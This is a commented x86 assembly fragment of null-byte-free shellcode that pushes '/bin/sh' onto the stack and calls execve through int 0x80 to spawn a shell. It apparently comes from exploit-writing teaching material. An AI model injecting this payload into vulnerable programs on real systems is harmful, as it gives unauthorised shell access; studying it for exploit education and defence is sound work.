mov $0x68732f30,%eax    /* mov "hs/0" into eax */
shr $8,%eax             /* shift right eax by 8 bits to create "\0hs/" turning the 0 at the end in a leading \0 :)*/
push %eax               /* push the value to the stack */
push $0x6e69622f        /* push "nib/" to the stack */
mov %esp,%ebx           /* mov current stackpointer to ebx (pointer to "/bin/sh\0") */
xor %edx,%edx           /* put 0 in edx without using a null byte */
push %edx               /* push a \0 to the stack (this will be our Argv)*/
push %ebx               /* push the pointer to /bin/sh */
mov %esp,%ecx           /* ecx contains now pointer to the pointer to "/bin/sh\0" */
xor %eax,%eax           /* zero out eax */
mov $0x0b,%al           /* get a 11 into eax without useing null byte (syscall 11 is execve) */
int $0x80               /* run syscall in eax */
